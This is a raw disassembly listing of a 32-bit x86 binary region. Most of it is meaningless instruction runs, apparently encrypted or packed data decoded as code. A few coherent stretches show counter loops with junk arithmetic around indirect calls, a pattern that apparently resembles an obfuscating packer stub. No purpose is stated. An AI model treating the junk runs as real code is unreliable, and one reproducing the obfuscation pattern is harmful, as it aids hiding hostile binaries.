  40682a:	sbb    BYTE PTR [esi-0x54ca4ce2],dl
  406830:	repz pop ds
  406832:	jmp    0xe5162f7c
  406837:	lds    eax,FWORD PTR [edx]
  406839:	aas    
  40683a:	cmp    BYTE PTR [ecx-0x2be72456],bh
  406840:	jb     0x406877
  406842:	xchg   ecx,eax
  406843:	js     0x4067e5
  406845:	lods   al,BYTE PTR ds:[esi]
  406846:	fwait
  406847:	mov    ch,dl
  406849:	push   ds
  40684a:	xor    ebx,DWORD PTR [eax]
  40684c:	retf   0x4294
  40684f:	jo     0x4068bf
  406851:	iret   
  406852:	dec    edi
  406853:	push   es
  406854:	in     eax,0x8f
  406856:	(bad)  
  406857:	in     eax,dx
  406858:	mov    eax,0xa9ae341e
  40685d:	bound  ebp,QWORD PTR ds:0x72d128f3
  406863:	nop
  406864:	mov    esp,0x914cead2
  406869:	ret    
  40686a:	push   eax
  40686b:	xchg   esp,eax
  40686c:	loope  0x406842
  40686e:	mov    eax,0x5c905d3
  406873:	test   BYTE PTR [ecx+ebx*1+0x7a7ce15a],dh
  40687a:	test   BYTE PTR ds:0x46e49d58,ah
  406880:	pop    esi
  406881:	mov    dh,0xdf
  406883:	mov    eax,ds:0x44eb3217
  406888:	add    ebx,DWORD PTR [ebp+0x6b]
  40688b:	jmp    0xc5740526
  406890:	outs   dx,BYTE PTR ds:[esi]
  406891:	lahf   
  406892:	sar    BYTE PTR [edi],1
  406894:	or     al,0xa3
  406896:	xchg   edi,eax
  406897:	(bad)  
  406898:	fdiv   QWORD PTR [ebx]
  40689a:	pop    ebp
  40689b:	sub    edx,DWORD PTR [ebx]
  40689d:	(bad)  
  40689e:	enter  0x39a6,0xa
  4068a2:	mov    dl,0x8a
  4068a4:	jb     0x406847
  4068a6:	push   esp
  4068a7:	das    
  4068a8:	lahf   
  4068a9:	jecxz  0x40683b
  4068ab:	pop    ss
  4068ac:	dec    eax
  4068ad:	sub    DWORD PTR [ecx+0x19b7973c],ecx
  4068b3:	add    al,0xfe
  4068b5:	sbb    al,0x70
  4068b7:	mov    ah,0x67
  4068b9:	sbb    edi,DWORD PTR [esi+0xb9858b3]
  4068bf:	out    dx,eax
  4068c0:	cmp    al,0x4f
  4068c2:	xchg   esi,eax
  4068c3:	cmp    DWORD PTR [ebp+0x52539005],0x32
  4068ca:	inc    edx
  4068cb:	scas   al,BYTE PTR es:[edi]
  4068cc:	in     al,dx
  4068cd:	addr16 cdq 
  4068cf:	mov    dl,ch
  4068d1:	ret    0xada7
  4068d4:	pop    ebp
  4068d5:	ret    0x18
  4068d8:	push   ebp
  4068d9:	mov    ebp,esp
  4068db:	sub    esp,0x58
  4068de:	mov    DWORD PTR ds:0x42a7bd,0x1f
  4068e8:	cmp    DWORD PTR ds:0x42a7bd,0x0
  4068ef:	je     0x406947
  4068f5:	cmp    DWORD PTR ds:0x42a7bd,0x8
  4068fc:	jne    0x406916
  406902:	push   DWORD PTR [ebp-0x1c]
  406905:	push   DWORD PTR [ebp-0x24]
  406908:	push   0x42aaaa
  40690d:	push   DWORD PTR [ebp-0x10]
  406910:	call   DWORD PTR ds:0x41d18c
  406916:	cmp    DWORD PTR ds:0x42a7bd,0x9
  40691d:	jne    0x406931
  406923:	xor    eax,eax
  406925:	or     eax,DWORD PTR ds:0x42a7bd
  40692b:	dec    eax
  40692c:	mov    ds:0x42a7bd,eax
  406931:	mov    eax,ds:0x42a7bd
  406936:	dec    eax
  406937:	mov    ds:0x42a7bd,eax
  40693c:	jmp    0x4068e8
  406941:	and    DWORD PTR ds:0x42a769,edx
  406947:	mov    ecx,DWORD PTR [ebp+0x8]
  40694a:	jmp    0x406c53
  40694f:	int3   
  406950:	(bad)
  406953:	(bad)  
  406955:	fcmove st,st(1)
  406957:	in     eax,dx
  406958:	loop   0x406947
  40695a:	out    dx,eax
  40695b:	bound  esi,QWORD PTR [ebx+eax*2+0x78c900f4]
  406962:	js     0x4069c8
  406964:	jle    0x4069de
  406966:	js     0x40699a
  406968:	and    DWORD PTR [ecx+edi*1],0xffffffdd
  40696c:	(bad)  
  40696d:	jmp    FWORD PTR ds:0x67c9615a
  406973:	out    dx,al
  406974:	je     0x406976
  406976:	into   
  406977:	mov    bh,0x8b
  406979:	mov    ds:0x590add13,eax
  40697e:	ret    0xe5d9
  406981:	stos   DWORD PTR es:[edi],eax
  406982:	cmp    dh,BYTE PTR [edx+0x1a37b5d2]
  406988:	(bad)  
  406989:	pop    esi
  40698a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40698b:	cmp    DWORD PTR ds:0xb5191882,ecx
  406991:	scas   al,BYTE PTR es:[edi]
  406992:	adc    eax,0x4a9c5fba
  406997:	int3   
  406998:	push   cs
  406999:	jno    0x4069a7
  40699b:	cmp    BYTE PTR [esi-0x79],bh
  40699e:	shr    BYTE PTR [eax-0x3958c963],cl
  4069a4:	cmp    BYTE PTR ds:0xfce72162,bl
  4069aa:	(bad)  
  4069ab:	xor    eax,eax
  4069ad:	dec    edi
  4069ae:	mov    edx,0x532139ee
  4069b3:	jmp    0x223a9dd7
  4069b8:	cmp    eax,0xd0305e61
  4069bd:	leave  
  4069be:	dec    edx
  4069bf:	shl    BYTE PTR [ebp+0x8b28c5],0x28
  4069c6:	dec    edx
  4069c7:	ds dec ecx
  4069c9:	push   0x9b706f32
  4069ce:	fstp   DWORD PTR [ecx+0x2d]
  4069d1:	sub    al,0xe9
  4069d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069d5:	or     ebx,DWORD PTR [edx-0x3d]
  4069d8:	je     0x4069ac
  4069da:	daa    
  4069db:	(bad)  
  4069dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069dd:	in     al,0xe3
  4069df:	mov    ebp,0xf519db4
  4069e4:	aam    0xee
  4069e6:	iret   
  4069e7:	mov    edx,0x5c9d3a45
  4069ec:	mov    edi,0x9d10ce18
  4069f1:	jmp    0x145838c
  4069f6:	dec    edx
  4069f7:	mov    esp,0x6c4c1713
  4069fc:	lahf   
  4069fd:	icebp  
  4069fe:	call   0xdaf714ca
  406a03:	mov    edx,0xa56e64d4
  406a08:	sub    DWORD PTR [edi-0x2ae9751c],edx
  406a0e:	cmp    BYTE PTR [edx],ah
  406a10:	mov    ah,0x84
  406a12:	icebp  
  406a13:	enter  0x8f9c,0x5a
  406a17:	dec    ebp
  406a18:	aas    
  406a19:	pop    ds
  406a1a:	dec    ecx
  406a1b:	shr    BYTE PTR [esi+0x66],1
  406a1e:	repnz mov dl,BYTE PTR ds:0xadfb657d
  406a25:	jo     0x4069b8
  406a27:	aad    0x87
  406a29:	pop    ss
  406a2a:	jecxz  0x406a10
  406a2c:	pusha  
  406a2d:	mov    cl,0xdb
  406a2f:	dec    esp
  406a30:	mov    bh,0x60
  406a32:	jle    0x406ab1
  406a34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a35:	xor    ch,BYTE PTR ds:0x7228
  406a3a:	sub    DWORD PTR [eax+0x249b609],ebx
  406a40:	or     eax,0x9804fd1c
  406a45:	adc    al,0xeb
  406a47:	mov    ch,0xe2
  406a49:	xor    BYTE PTR [edi+0x5d],cl
  406a4c:	ja     0x406a0f
  406a4e:	inc    edx
  406a4f:	popa   
  406a50:	(bad)  
  406a51:	or     eax,0xc98fbc33
  406a56:	es ins DWORD PTR es:[edi],dx
  406a58:	push   eax
  406a59:	repnz push ebp
  406a5b:	iret   
  406a5c:	jmp    0x26f2:0x9bcd3807
  406a63:	mov    ?,WORD PTR [ecx]
  406a65:	repz test al,0x87
  406a68:	adc    eax,0x753fdaeb
  406a6d:	adc    BYTE PTR [edx],bl
  406a6f:	(bad)  
  406a70:	pop    edx
  406a71:	jbe    0x406a84
  406a73:	in     al,dx
  406a74:	loopne 0x406aea
  406a76:	pop    eax
  406a77:	inc    edx
  406a78:	pusha  
  406a79:	js     0x406a44
  406a7b:	push   ss
  406a7c:	adc    al,0x59
  406a7e:	int    0xe8
  406a80:	sub    esp,edi
  406a82:	(bad)  
  406a83:	cwde   
  406a84:	jecxz  0x406a0e
  406a86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a87:	scas   eax,DWORD PTR es:[edi]
  406a88:	int3   
  406a89:	(bad)  
  406a8a:	xchg   ebx,eax
  406a8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a8c:	mov    bh,0xee
  406a8e:	xchg   edx,eax
  406a8f:	mul    DWORD PTR [ecx+0x1c]
  406a92:	icebp  
  406a93:	dec    esi
  406a95:	jb     0x406a31
  406a97:	push   0x62
  406a99:	(bad)  
  406a9a:	push   ebx
  406a9b:	lea    ecx,[eax]
  406a9d:	jbe    0x7f9d8961
  406aa3:	es push cs
  406aa5:	pop    ebp
  406aa6:	mov    esi,0x86553372
  406aab:	aam    0x18
  406aad:	sbb    eax,0x1429a1dd
  406ab2:	and    DWORD PTR [eax],esp
  406ab4:	adc    edx,DWORD PTR [esi]
  406ab6:	sar    BYTE PTR [esi-0xae409ac],0xd6
  406abd:	lds    edi,FWORD PTR [eax-0x10e89eda]
  406ac3:	retf   
  406ac4:	cmc    
  406ac5:	mov    ss,WORD PTR [esp+esi*8+0x40]
  406ac9:	xchg   BYTE PTR [esi-0x15],bl
  406acc:	pop    eax
  406acd:	push   0xa24bbbb2
  406ad2:	jg     0x406ab1
  406ad4:	push   esp
  406ad5:	sbb    dh,BYTE PTR [ebx-0x7120857d]
  406adb:	(bad)  
  406adc:	mov    bl,0x61
  406ade:	mov    edx,0xeb48395e
  406ae3:	xor    BYTE PTR [eax],0xb5
  406ae6:	xor    ebp,DWORD PTR [esi]
  406ae8:	mov    cs,WORD PTR [edx+0x27]
  406aeb:	push   esi
  406aec:	int3   
  406aed:	ret    
  406aee:	pop    esi
  406aef:	arpl   WORD PTR [eax-0x35],sp
  406af2:	add    ecx,edi
  406af4:	fst    DWORD PTR [edx-0x74]
  406af7:	pop    edi
  406af8:	out    0x98,al
  406afa:	nop
  406afb:	es sub esi,esi
  406afe:	or     al,BYTE PTR [ecx]
  406b00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b02:	inc    eax
  406b03:	inc    ebx
  406b04:	mov    eax,0x23109bee
  406b09:	xor    al,0xd9
  406b0b:	test   DWORD PTR [edx-0x29c9233],0x11f15500
  406b15:	repnz dec eax
  406b17:	sub    cl,dh
  406b19:	je     0x406b25
  406b1b:	or     dh,BYTE PTR [edi+0x4aa595ca]
  406b21:	int3   
  406b22:	cld    
  406b23:	mov    ecx,DWORD PTR [eax+ebp*1]
  406b26:	xor    ecx,esi
  406b28:	or     ebx,0x64b69d81
  406b2e:	push   ecx
  406b2f:	push   esp
  406b30:	jmp    0x4f6a:0x86f88428
  406b37:	and    DWORD PTR [eax],0x55
  406b3a:	imul   DWORD PTR ds:0x1ece1847
  406b40:	push   cs
  406b41:	sahf   
  406b42:	cmp    al,0x93
  406b44:	push   esi
  406b45:	out    dx,al
  406b46:	adc    al,0xc7
  406b48:	mov    ds:0x142fbafa,al
  406b4d:	jb     0x406af2
  406b4f:	or     dl,cl
  406b51:	ins    BYTE PTR es:[edi],dx
  406b52:	imul   ebx,DWORD PTR [edx],0xffffff97
  406b55:	mov    ds:0xc8b61836,eax
  406b5a:	push   ebp
  406b5b:	pop    ss
  406b5c:	aaa    
  406b5d:	cwde   
  406b5e:	test   dh,ah
  406b60:	mov    es,WORD PTR [eax-0x74eea022]
  406b66:	clc    
  406b67:	popa   
  406b68:	mov    ds:0xd76ff2bc,eax
  406b6d:	fcom   st(5)
  406b6f:	dec    edx
  406b70:	dec    edi
  406b71:	popa   
  406b72:	push   0x71
  406b74:	push   es
  406b75:	cmp    al,0x71
  406b77:	icebp  
  406b78:	in     al,0x64
  406b7a:	jmp    0x991b:0x831a7ea4
  406b81:	clc    
  406b82:	mov    al,ss:0x28e53c0
  406b88:	lahf   
  406b89:	xor    BYTE PTR [ecx+0x73052ca1],0x21
  406b90:	test   dl,dh
  406b92:	mov    dh,0xe6
  406b94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b95:	aaa    
  406b96:	loopne 0x406baa
  406b98:	mov    eax,0xc9ba34e5
  406b9d:	pop    ecx
  406b9e:	repz arpl WORD PTR [ecx],di
  406ba1:	sbb    DWORD PTR [edi+edi*8+0x7d61c18f],0xbec49cf8
  406bac:	xchg   ebp,eax
  406bad:	and    al,0xd
  406baf:	add    edx,ebp
  406bb1:	jp     0x406b57
  406bb3:	sbb    al,0x42
  406bb5:	ret    0xbbc5
  406bb8:	data16 xchg BYTE PTR [eax-0x96bb21a],dh
  406bbf:	inc    ecx
  406bc0:	mov    es,WORD PTR [edi]
  406bc2:	shr    esi,cl
  406bc4:	cmc    
  406bc5:	push   ss
  406bc6:	pop    edx
  406bc7:	les    esi,FWORD PTR [eax-0x1a439e0c]
  406bcd:	adc    edx,ecx
  406bcf:	popa   
  406bd0:	call   0x9e58316f
  406bd5:	or     ah,ah
  406bd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bd8:	pop    ebx
  406bd9:	sbb    bh,BYTE PTR [ecx-0x3e86514d]
  406bdf:	lods   al,BYTE PTR ds:[esi]
  406be0:	push   ds
  406be1:	and    eax,0xabf062ad
  406be6:	ss daa 
  406be8:	rol    BYTE PTR [esi-0x1c013d11],cl
  406bee:	outs   dx,DWORD PTR ds:[esi]
  406bef:	inc    eax
  406bf0:	mov    dl,0x1a
  406bf2:	stos   DWORD PTR es:[edi],eax
  406bf3:	pushf  
  406bf4:	gs jmp 0x6dab63d0
  406bfa:	or     bl,BYTE PTR [esi]
  406bfc:	arpl   WORD PTR [edi+0x51abfc4a],si
  406c02:	lahf   
  406c03:	mov    gs,esp
  406c05:	nop    DWORD PTR [edx+edi*4+0x4e8b2a04]
  406c0d:	ss mov ecx,0x41f70e6
  406c13:	mov    ds:0x7608e166,eax
  406c18:	mov    ah,al
  406c1a:	mov    edx,0xcd50c57f
  406c1f:	repz hlt 
  406c21:	arpl   dx,si
  406c23:	pop    edi
  406c24:	not    DWORD PTR [ecx+0x23]
  406c27:	xchg   ebp,eax
  406c28:	xchg   edi,eax
  406c29:	sub    eax,0xb494cc62
  406c2e:	aaa    
  406c2f:	fsubr  DWORD PTR [ebx+0x2e]
  406c32:	and    ebx,DWORD PTR [eax]
  406c34:	je     0x406ca2
  406c36:	sub    ch,BYTE PTR [esi+ebx*2]
  406c39:	ss in  eax,dx
  406c3b:	xchg   ecx,eax
  406c3c:	pusha  
  406c3d:	in     eax,dx
  406c3e:	jmp    0xf99f1dda
  406c43:	jbe    0x406caf
  406c45:	cmp    DWORD PTR [edi-0x6583b9dd],0xfe038ee6
  406c4f:	push   es
  406c50:	jbe    0x406c87
  406c52:	test   DWORD PTR [eax+0x8a36],edi
  406c58:	adc    DWORD PTR ds:0x42a7c9,0x4fea
  406c62:	xor    ax,WORD PTR [ecx+0x20]
  406c66:	sub    DWORD PTR ds:0x42a7f5,0x417a
  406c70:	mov    ecx,0x3afc
  406c75:	xor    DWORD PTR ds:0x42a84d,0x2c9d
  406c7f:	jmp    0x406f88
  406c84:	rol    dh,cl
  406c86:	cmp    al,0xd3
  406c88:	aam    0xd9
  406c8a:	rol    ebp,1
  406c8c:	mov    eax,ebx
  406c8e:	and    DWORD PTR [ecx-0xa],ebx
  406c91:	dec    edx
  406c92:	push   ecx
  406c93:	ins    BYTE PTR es:[edi],dx
  406c94:	ins    BYTE PTR es:[edi],dx
  406c95:	iret   
  406c96:	js     0x406d10
  406c98:	fs jle 0x406d13
  406c9b:	js     0x406cb9
  406c9d:	mov    DWORD PTR ds:0x92892861,ebp
  406ca3:	sub    BYTE PTR [esi+edi*1-0x6b49a8ec],cl
  406caa:	dec    edx
  406cab:	dec    edx
  406cac:	pusha  
  406cad:	pushf  
  406cae:	mov    al,BYTE PTR [ecx-0x1c]
  406cb1:	sub    esp,ebp
  406cb3:	sub    ah,BYTE PTR [ebx+esi*4]
  406cb6:	pushf  
  406cb7:	stos   DWORD PTR es:[edi],eax
  406cb8:	or     BYTE PTR [edx+0x55],ch
  406cbb:	pop    ecx
  406cbc:	add    al,BYTE PTR [ecx+edx*1+0x3a476e40]
  406cc3:	mov    edx,0xcfe6fcad
  406cc8:	dec    esi
  406cc9:	xchg   DWORD PTR [esi+0x46],edi
  406ccc:	mov    bh,0x86
  406cce:	mov    al,ds:0x6bb2d4b1
  406cd3:	jae    0x406c83
  406cd5:	inc    edx
  406cd7:	call   0x8e81:0xe914e173
  406cde:	xlat   BYTE PTR ds:[ebx]
  406cdf:	push   ds
  406ce0:	cmp    al,0x1
  406ce2:	ss jbe 0x406cb2
  406ce5:	lods   al,BYTE PTR ds:[esi]
  406ce6:	jns    0x406ce4
  406ce8:	xchg   ecx,eax
  406ce9:	ja     0x406d41
  406ceb:	sahf   
  406cec:	sub    DWORD PTR [eax+0x7201c271],ebp
  406cf2:	jecxz  0x406c8c
  406cf4:	aam    0x4a
  406cf6:	ins    BYTE PTR es:[edi],dx
  406cf7:	xor    al,0x4
  406cf9:	nop
  406cfa:	jl     0x406cb0
  406cfc:	mov    ds:0xe6d629f7,al
  406d01:	xchg   ebx,eax
  406d02:	sub    eax,edi
  406d04:	push   0x4443242f
  406d09:	or     al,0x1b
  406d0b:	out    dx,al
  406d0c:	gs xchg ebx,eax
  406d0e:	in     al,dx
  406d0f:	pop    eax
  406d10:	adc    ecx,DWORD PTR [ecx+ebx*2]
  406d13:	hlt    
  406d14:	aad    0x5c
  406d16:	or     ch,bl
  406d18:	mov    edx,esp
  406d1a:	test   eax,0x907f4dc9
  406d1f:	or     eax,0xc10177e3
  406d24:	cmp    eax,0xfc816cf1
  406d29:	les    ebx,FWORD PTR [ebp-0x298359ab]
  406d2f:	pop    esp
  406d30:	sub    BYTE PTR [ecx-0x308ebe60],bl
  406d36:	jle    0x406cec
  406d38:	nop
  406d39:	in     al,0xdf
  406d3b:	sbb    al,0xd7
  406d3d:	rol    BYTE PTR [ebx],0xe6
  406d40:	push   esi
  406d41:	sub    al,0xe1
  406d43:	loope  0x406d3e
  406d45:	fs nop esi
  406d49:	cmp    eax,0x9e803b9e
  406d4e:	(bad)  
  406d4f:	or     al,0xab
  406d51:	xor    eax,0x4d770bf9
  406d56:	adc    bh,bh
  406d58:	lea    edx,[edx]
  406d5a:	mov    al,ds:0x32fedd90
  406d60:	xchg   ecx,eax
  406d62:	sbb    eax,0xd7809199
  406d67:	inc    esi
  406d68:	mov    edi,0xf55fc335
  406d6d:	adc    ah,BYTE PTR [ecx+0x23]
  406d70:	lds    ebx,FWORD PTR [eax-0x79bd8cda]
  406d76:	ins    BYTE PTR es:[edi],dx
  406d77:	fisttp QWORD PTR [ebx+0x31]
  406d7a:	retf   
  406d7b:	mov    esp,0x34adc12f
  406d80:	test   eax,0x7476e418
  406d85:	add    al,0x19
  406d87:	push   edi
  406d88:	iret   
  406d89:	imul   esi,DWORD PTR ds:0x46e05efc,0xc2afb1ab
  406d93:	call   0x46710c79
  406d98:	xor    bl,BYTE PTR [ecx+edi*2]
  406d9b:	mov    WORD PTR [edi],es
  406d9d:	call   0xcd2592a1
  406da2:	icebp  
  406da3:	(bad)  
  406da4:	or     bl,BYTE PTR [edi-0x7462d3d7]
  406daa:	xor    BYTE PTR [ecx+0x33475cfd],0xbb
  406db1:	mov    ch,BYTE PTR [ebp-0x373335b9]
  406db7:	popf   
  406db8:	add    eax,0x59314ccb
  406dbd:	call   0x517a:0x8f37e1c6
  406dc4:	jg     0x406db9
  406dc6:	sbb    BYTE PTR [edi],bl
  406dc8:	std    
  406dc9:	ins    DWORD PTR es:[edi],dx
  406dca:	(bad)  
  406dcb:	pop    ecx
  406dcc:	sbb    eax,0x3cebc03b
  406dd1:	mov    dh,0xbf
  406dd3:	test   al,0x24
  406dd5:	jmp    0x7081:0x6839bccb
  406ddc:	shl    edi,1
  406dde:	sub    DWORD PTR [edx+edx*4-0x7d],ecx
  406de2:	mov    eax,ds:0x58a4f2ce
  406de7:	ret    0xdfa6
  406dea:	or     DWORD PTR [ecx],0xca7e114a
  406df0:	sub    al,0x9b
  406df2:	pop    ebx
  406df3:	pop    esi
  406df4:	xor    BYTE PTR [eax-0x41],cl
  406df7:	sti    
  406df8:	pop    es
  406df9:	pop    esi
  406dfa:	dec    eax
  406dfb:	mov    DWORD PTR [ebx+0x5e6b999f],ebx
  406e01:	hlt    
  406e02:	jl     0x406e54
  406e04:	pop    ss
  406e05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e06:	inc    ebx
  406e07:	adc    DWORD PTR [eax],eax
  406e09:	mov    ss,WORD PTR [esi]
  406e0b:	pop    esp
  406e0c:	sti    
  406e0d:	jo     0x406e4a
  406e0f:	inc    edi
  406e10:	stc    
  406e11:	sbb    eax,0xc2333b5d
  406e16:	pop    ss
  406e17:	inc    ebx
  406e18:	add    BYTE PTR [esi+0x19e908e6],bl
  406e1e:	jmp    0x30d89b3d
  406e23:	cmp    ebp,DWORD PTR [ebp-0x6]
  406e26:	or     DWORD PTR ds:[esi],edx
  406e29:	pop    esp
  406e2a:	mov    eax,0xbb79f414
  406e2f:	cs loop 0x406dd4
  406e32:	mov    al,ds:0xb165b8df
  406e37:	popf   
  406e38:	scas   al,BYTE PTR es:[edi]
  406e39:	jmp    FWORD PTR [ecx+eiz*1+0x5c]
  406e3d:	xchg   edi,eax
  406e3e:	retf   0x8fe0
  406e41:	clc    
  406e42:	inc    esi
  406e43:	popa   
  406e44:	pop    esp
  406e45:	inc    edi
  406e46:	les    ebp,FWORD PTR cs:[edx+0x5741aedc]
  406e4d:	lds    edi,FWORD PTR [esi]
  406e4f:	loop   0x406e78
  406e51:	mov    ebx,0x3a399c00
  406e56:	and    cl,bl
  406e58:	and    eax,0x8c51c392
  406e5d:	push   ecx
  406e5e:	add    dl,dl
  406e60:	(bad)  
  406e61:	mov    BYTE PTR [edi-0x32b63fc0],0x45
  406e68:	fs push ecx
  406e6a:	jno    0x406ee8
  406e6c:	not    DWORD PTR [ecx+0x54497524]
  406e72:	ja     0x406e44
  406e74:	rcl    esp,0x1d
  406e77:	add    ebx,edx
  406e79:	mov    cl,0x3
  406e7b:	shl    BYTE PTR [ebx+0x47fc8e60],cl
  406e81:	popw   ss
  406e83:	jns    0x406e09
  406e85:	les    ebx,FWORD PTR [edx-0x9]
  406e88:	in     al,0xaf
  406e8a:	(bad)  
  406e8b:	mov    eax,ds:0x79e5e77a
  406e90:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  406e92:	js     0x406e26
  406e94:	and    bh,BYTE PTR [ebx]
  406e96:	not    DWORD PTR [ecx+0x2017fcd]
  406e9c:	adc    eax,0xe358a0b3
  406ea1:	jns    0x406f17
  406ea3:	push   edx
  406ea4:	and    DWORD PTR ss:[esp+esi*8-0x3f],edx
  406ea9:	mov    esi,0x328d8781
  406eae:	mov    ds:0x6fe88405,eax
  406eb3:	cwde   
  406eb4:	ror    BYTE PTR [ecx-0x33],0xb8
  406eb8:	and    ah,bh
  406eba:	jb     0x406e9d
  406ebc:	xchg   ebx,eax
  406ebd:	mov    esi,0x51de6754
  406ec2:	call   0x8cd13cbb
  406ec7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ec8:	pop    ebx
  406ec9:	mov    esi,0xb13610b5
  406ece:	mov    ds:0xb2d293a7,al
  406ed3:	and    BYTE PTR [edi-0x3bfdeb0a],cl
  406ed9:	(bad)  
  406eda:	les    esi,FWORD PTR [ebp+0xa17eaf0]
  406ee0:	imul   esp,DWORD PTR [edi],0x10
  406ee3:	jnp    0x7c55041e
  406ee9:	(bad)
  406eec:	pop    ds
  406eed:	mov    esi,0xda97337d
  406ef2:	loope  0x406e79
  406ef4:	push   esp
  406ef5:	mov    eax,0xeb2ab59
  406efa:	inc    ecx
  406efb:	loop   0x406e9f
  406efd:	dec    eax
  406efe:	jge    0x406ebe
  406f00:	aaa    
  406f01:	sar    DWORD PTR [ecx+0x6f],0x56
  406f05:	jecxz  0x406eb1
  406f07:	popf   
  406f08:	loop   0x406eed
  406f0a:	rcr    ch,cl
  406f0c:	and    BYTE PTR gs:[esi-0xd],bl
  406f10:	cmc    
  406f11:	rcr    BYTE PTR [ebx],1
  406f13:	es call 0x4348:0x496838fe
  406f1b:	fnstenv [edi]
  406f1d:	dec    ebx
  406f1e:	jl     0x406ec9
  406f20:	pop    ebp
  406f21:	out    0x89,al
  406f23:	pop    eax
  406f24:	mov    eax,ds:0xae613cbd
  406f29:	push   eax
  406f2a:	add    bh,0xcd
  406f2d:	and    BYTE PTR [esi+0x55],cl
  406f30:	xor    BYTE PTR [ecx],ah
  406f32:	test   BYTE PTR [edi-0x4c],0xa8
  406f36:	fwait
  406f37:	pop    ecx
  406f38:	(bad)  
  406f39:	push   ss
  406f3a:	(bad)  
  406f3b:	neg    DWORD PTR [ebp-0x46805633]
  406f41:	pop    ds
  406f42:	pop    esi
  406f43:	rol    ebp,1
  406f45:	leave  
  406f46:	ss enter 0x5415,0xe5
  406f4b:	or     esi,DWORD PTR [edx]
  406f4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f4f:	popa   
  406f50:	and    eax,0x4df8d94d
  406f55:	in     al,dx
  406f56:	dec    ecx
  406f57:	sbb    DWORD PTR [eax],edi
  406f59:	mov    ebx,0xb1e169c7
  406f5e:	inc    eax
  406f5f:	add    BYTE PTR [eax+0x74],al
  406f62:	push   eax
  406f63:	daa    
  406f64:	jmp    0xc944:0x908aae70
  406f6b:	sbb    BYTE PTR [edi],0x42
  406f6e:	imul   ecx
  406f70:	jmp    0x406fd9
  406f72:	jb     0x406f9d
  406f74:	and    al,0x20
  406f76:	sbb    ah,ch
  406f78:	dec    ebx
  406f79:	xor    DWORD PTR [ecx+0x14039e4],ebx
  406f7f:	mov    dl,0xc9
  406f81:	mov    ebx,fs
  406f83:	loope  0x406f5c
  406f85:	pop    ss
  406f86:	daa    
  406f87:	or     eax,0x1bc10366
  406f8c:	or     eax,0x42a881
  406f91:	movzx  eax,ax
  406f94:	and    DWORD PTR ds:0x42a885,0x0
  406f9e:	jmp    0x406fb0
  406fa3:	mov    ecx,DWORD PTR ds:0x42a885
  406fa9:	inc    ecx
  406faa:	mov    DWORD PTR ds:0x42a885,ecx
  406fb0:	cmp    DWORD PTR ds:0x42a885,0x11
  406fb7:	jae    0x407009
  406fbd:	cmp    DWORD PTR ds:0x42a885,0x7
  406fc4:	jne    0x406fe4
  406fca:	push   0x2396
  406fcf:	push   0x42ab22
  406fd4:	push   0x42ab22
  406fd9:	push   0x42ab04
  406fde:	call   DWORD PTR ds:0x41d190
  406fe4:	cmp    DWORD PTR ds:0x42a885,0x6
  406feb:	jne    0x406ffe
  406ff1:	mov    ecx,DWORD PTR ds:0x42a885
  406ff7:	inc    ecx
  406ff8:	mov    DWORD PTR ds:0x42a885,ecx
  406ffe:	jmp    0x406fa3
  407003:	adc    DWORD PTR ds:0x42a7c9,edx
  407009:	mov    DWORD PTR [ebp-0xc],eax
  40700c:	xor    ecx,ecx
  40700e:	add    ecx,DWORD PTR ds:0x42a76d
  407014:	sub    DWORD PTR ds:0x42a841,ecx
  40701a:	jmp    0x407323
  40701f:	cmp    al,0xc4
  407021:	(bad)  
  407022:	rcl    dh,cl
  407024:	rol    ah,cl
  407026:	ficom  DWORD PTR [esi+ebp*2-0xc]
  40702a:	out    0x5e,al
  40702c:	adc    dh,BYTE PTR [esp+eiz*8]
  40702f:	pop    eax
  407030:	int3   
  407031:	js     0x4070ab
  407033:	fs jle 0x4070ae
  407036:	js     0x407049
  407038:	not    BYTE PTR [ecx+0x11300e65]
  40703e:	xor    DWORD PTR [ebp+0x4a],ecx
  407041:	mov    edi,0xdfbd252f
  407046:	push   ebp
  407047:	push   esi
  407048:	mov    ch,0xd
  40704a:	fidiv  DWORD PTR [edi-0x73]
  40704d:	dec    ebp
  40704e:	aas    
  40704f:	mov    eax,0x32f68e15
  407054:	sbb    eax,0x7a7a0d0b
  407059:	add    eax,0x8e3af540
  40705e:	jge    0x407054
  407060:	cmp    eax,0xfcac8dc9
  407065:	mov    ?,WORD PTR ds:0x4e2cf48b
  40706b:	adc    BYTE PTR [edi],bh
  40706d:	shl    BYTE PTR [edi+0x19],cl
  407070:	push   0x46
  407072:	and    DWORD PTR [esi-0x7ddffff6],esi
  407078:	cmp    esi,edx
  40707a:	sbb    ecx,ebx
  40707c:	enter  0x3df6,0x6c
  407080:	xchg   ebp,eax
  407081:	dec    edx
  407082:	inc    edi
  407083:	inc    eax
  407084:	push   esp
  407085:	sahf   
  407086:	pop    eax
  407087:	dec    ebx
  407088:	outs   dx,BYTE PTR ds:[esi]
  407089:	mov    ebx,0xdbafcaf2
  40708e:	jbe    0xc63fc37f
  407094:	or     al,0x1b
  407096:	aad    0x16
  407098:	mov    cl,0x7e
  40709a:	leave  
  40709b:	retf   0xea70
  40709e:	lods   al,BYTE PTR ds:[esi]
  40709f:	inc    esi
  4070a0:	xchg   esi,eax
  4070a1:	iret   
  4070a2:	jle    0x4070c0
  4070a4:	lods   eax,DWORD PTR ds:[esi]
  4070a5:	mov    ds:0xb95cd236,al
  4070aa:	fwait
  4070ab:	xchg   DWORD PTR [ebp+0x7d],ebp
  4070ae:	xchg   ebx,eax
  4070af:	pop    ebx
  4070b0:	push   eax
  4070b1:	mov    al,0x65
  4070b3:	xchg   edi,eax
  4070b4:	aad    0xcf
  4070b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070b7:	and    edi,DWORD PTR [ecx]
